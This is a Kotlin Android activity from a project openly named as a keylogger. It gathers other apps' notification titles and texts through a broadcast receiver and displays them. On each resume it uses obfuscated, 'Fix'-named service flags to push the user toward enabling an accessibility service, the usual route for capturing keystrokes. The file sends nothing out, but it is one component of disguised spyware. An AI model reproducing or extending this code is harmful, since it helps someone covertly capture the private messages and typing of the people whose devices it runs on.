package com.azamovhudstc.androidkeylogger

import android.content.*
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.RecyclerView
import java.io.File
import kotlin.collections.ArrayList

class MainFixActivity : AppCompatActivity() {
    private val fileName = "notifications.txt"
    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: NotificationAdapter
    private val notifications = mutableListOf<NotificationModel>()

    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            }
        }
    }


    // Define a BroadcastReceiver to receive notifications from NotificationListenerService
    private val notificationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val packageName = intent?.getStringExtra("packageName")
            val title = intent?.getStringExtra("title")
            val text = intent?.getStringExtra("text")

            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
                adapter.addNotification(NotificationModel(packageName, title, text))
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        recyclerView = findViewById(R.id.notificationRecyclerView)
        adapter = NotificationAdapter(notifications)
        recyclerView.adapter = adapter

        // Register the BroadcastReceiver
        val filter = IntentFilter("com.yourpackage.NOTIFICATION_LISTENER")
        registerReceiver(notificationReceiver, filter)
    }

    override fun onDestroy() {
        super.onDestroy()
        // Unregister the BroadcastReceiver
        unregisterReceiver(notificationReceiver)
    }

    override fun onResume() {
        super.onResume()
        checkPermission()

    }

}
